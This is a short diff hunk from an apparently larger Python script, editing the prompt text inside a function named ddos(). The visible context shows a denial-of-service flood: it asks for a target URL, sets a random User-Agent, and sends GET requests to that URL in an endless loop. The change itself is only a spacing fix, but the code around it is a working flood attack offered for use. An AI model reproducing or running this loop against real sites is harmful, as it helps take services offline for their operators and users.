@@ -1170,7 +1170,7 @@ def ddos():
 		'User-Agent' : random.choice(users)
 	}
 
-	url = input(G + "Url for ddos attack:")
+	url = input(G + "Url for ddos attack: ")
 	while True:
 		requests.get(url, headers=headers)
 		print(R + "Get " + url)
